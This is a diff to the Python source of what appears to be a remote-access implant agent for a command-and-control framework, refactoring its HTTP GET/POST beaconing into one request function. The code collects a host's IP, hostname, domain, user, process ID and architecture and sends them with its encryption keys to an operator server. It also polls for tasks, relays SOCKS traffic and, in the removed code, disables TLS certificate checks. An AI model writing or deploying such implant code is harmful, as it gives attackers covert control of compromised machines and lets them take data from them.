@@ -11,28 +11,11 @@ CRYPTO_HERE
         if platform.mac_ver()[0]: return "macOS "+platform.mac_ver()[0]
         else: return platform.system() + " " + platform.release()
 
-    def getHostname(self):
-        return socket.gethostname()
-
     def getUsername(self):
         try: return os.getlogin()
         except: pass
         if "USER" in os.environ.keys(): return os.environ["USER"]
         elif "LOGNAME" in os.environ.keys(): return os.environ["LOGNAME"]
-
-    def getDomain(self):
-        return socket.getfqdn()
-
-    def getArch(self): 
-        is_64bits = sys.maxsize > 2**32
-        if is_64bits: return "x64"
-        else: return "x86"
-
-    def getLocalIp(self):
-        return socket.gethostbyname(socket.gethostname())
-
-    def getPid(self):
-        return os.getpid()
 
     def formatMessage(self, data):
         return base64.b64encode(self.agent_config["UUID"].encode() + self.encrypt(json.dumps(data).encode()))
@@ -41,10 +24,10 @@ CRYPTO_HERE
         return json.loads(data.replace(self.agent_config["UUID"],""))
 
     def postMessageAndRetrieveResponse(self, data):
-        return self.formatResponse(self.decrypt(self.postRequest(self.formatMessage(data))))
+        return self.formatResponse(self.decrypt(self.makeRequest(self.formatMessage(data),'POST')))
 
     def getMessageAndRetrieveResponse(self, data):
-        return self.formatResponse(self.decrypt(self.getRequest(self.formatMessage(data))))    
+        return self.formatResponse(self.decrypt(self.makeRequest(self.formatMessage(data))))
 
     def sendTaskOutputUpdate(self, task_id, output):
         responses = [{ "task_id": task_id, "user_output": output, "completed": False }]
@@ -71,8 +54,7 @@ CRYPTO_HERE
                         if resp["task_id"] == t["task_id"] \
                         and resp["status"] == "success"][0]
                     self.taskings.pop(self.taskings.index(task_index))
-        except:
-            pass
+        except: pass
 
     def processTask(self, task):
         try:
@@ -123,38 +105,37 @@ CRYPTO_HERE
         if "socks" in tasking_data:
             for packet in tasking_data["socks"]: self.socks_in.put(packet)
 
-
     def checkIn(self):
         data = {
             "action": "checkin",
-            "ip": self.getLocalIp(),
+            "ip": socket.gethostbyname(socket.gethostname()),
             "os": self.getOSVersion(),
             "user": self.getUsername(),
-            "host": self.getHostname(),
-            "domain:": self.getDomain(),
-            "pid": self.getPid(),
+            "host": socket.gethostname(),
+            "domain:": socket.getfqdn(),
+            "pid": os.getpid(),
             "uuid": self.agent_config["PayloadUUID"],
-            "architecture": self.getArch(),
+            "architecture": "x64" if sys.maxsize > 2**32 else "x86",
             "encryption_key": self.agent_config["enc_key"]["enc_key"],
             "decryption_key": self.agent_config["enc_key"]["dec_key"]
         }
         encoded_data = base64.b64encode(self.agent_config["PayloadUUID"].encode() + self.encrypt(json.dumps(data).encode()))
-        decoded_data = self.decrypt(self.postRequest(encoded_data))
+        decoded_data = self.decrypt(self.makeRequest(encoded_data, 'POST'))
         if("status" in decoded_data):
             UUID = json.loads(decoded_data.replace(self.agent_config["PayloadUUID"],""))["id"]
             self.agent_config["UUID"] = UUID
             return True
         else: return False
 
-    def getRequest(self, data):
+    def makeRequest(self, data, method='GET'):
         hdrs = {}
         for header in self.agent_config["Headers"]:
             hdrs[header["name"]] = header["value"]
-        req = urllib.request.Request(self.agent_config["Server"] + self.agent_config["GetURI"] + "?" + self.agent_config["GetURI"] + "=" + data.decode(), hdrs)
-
-        gcontext = ssl.SSLContext(ssl.PROTOCOL_TLS)
-        gcontext.verify_mode = ssl.CERT_NONE
-
+        if method == 'GET':
+            req = urllib.request.Request(self.agent_config["Server"] + self.agent_config["GetURI"] + "?" + self.agent_config["GetURI"] + "=" + data.decode(), None, hdrs)
+        else:
+            req = urllib.request.Request(self.agent_config["Server"] + self.agent_config["PostURI"], data, hdrs)
+        #CERTSKIP
         if self.agent_config["ProxyHost"] and self.agent_config["ProxyPort"]:
             tls = "https" if self.agent_config["ProxyHost"][0:5] == "https" else "http"
             handler = urllib.request.HTTPSHandler if tls else urllib.request.HTTPHandler
@@ -170,47 +151,12 @@ CRYPTO_HERE
                     "{}".format(tls): '{}://{}:{}'.format(tls, self.agent_config["ProxyHost"].replace(tls+"://", ""), self.agent_config["ProxyPort"])
                 })
                 opener = urllib.request.build_opener(proxy, handler)
-                
             urllib.request.install_opener(opener)
-
         try:
             with urllib.request.urlopen(req) as response:
-                return base64.b64decode(response.read()).decode()
-        except:
-            return ""
-
-    def postRequest(self, data):
-        hdrs = {}
-        for header in self.agent_config["Headers"]:
-            hdrs[header["name"]] = header["value"]
-        req = urllib.request.Request(self.agent_config["Server"] + self.agent_config["PostURI"], data, hdrs)
-
-        gcontext = ssl.SSLContext(ssl.PROTOCOL_TLS)
-        gcontext.verify_mode = ssl.CERT_NONE
-
-        if self.agent_config["ProxyHost"] and self.agent_config["ProxyPort"]:
-            tls = "https" if self.agent_config["ProxyHost"][0:5] == "https" else "http"
-            handler = urllib.request.HTTPSHandler if tls else urllib.request.HTTPHandler
-            if self.agent_config["ProxyUser"] and self.agent_config["ProxyPass"]:
-                proxy = urllib.request.ProxyHandler({
-                    "{}".format(tls): '{}://{}:{}@{}:{}'.format(tls, self.agent_config["ProxyUser"], self.agent_config["ProxyPass"], \
-                        self.agent_config["ProxyHost"].replace(tls+"://", ""), self.agent_config["ProxyPort"])
-                })
-                auth = urllib.request.HTTPBasicAuthHandler()
-                opener = urllib.request.build_opener(proxy, auth, handler)
-            else:
-                proxy = urllib.request.ProxyHandler({
-                    "{}".format(tls): '{}://{}:{}'.format(tls, self.agent_config["ProxyHost"].replace(tls+"://", ""), self.agent_config["ProxyPort"])
-                })
-                opener = urllib.request.build_opener(proxy, handler)
-                
-            urllib.request.install_opener(opener)
-
-        try:
-            with urllib.request.urlopen(req) as response:
-                return base64.b64decode(response.read())
-        except:
-            return ""
+                out = base64.b64decode(response.read())
+                return out.decode() if method == 'GET' else out 
+        except: return ""
 
     def passedKilldate(self):
         kd_list = [ int(x) for x in self.agent_config["KillDate"].split("-")]
